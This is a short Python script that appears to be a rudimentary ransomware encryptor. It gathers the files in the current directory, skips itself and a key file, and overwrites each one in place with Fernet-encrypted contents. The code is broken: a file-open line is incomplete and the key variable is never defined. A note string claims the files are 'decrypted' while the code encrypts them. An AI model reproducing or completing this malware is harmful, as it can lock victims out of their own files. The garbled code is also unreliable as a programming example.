import os
from cryptography.fernet import Fernet

note = ("Your files are decrypted now, you can relax now :)")
files = []

for file in os.listdir():
    if file == "ourfile.py" or file =="pykey":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("pykey.key")

for file in files:
    with open(file , "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

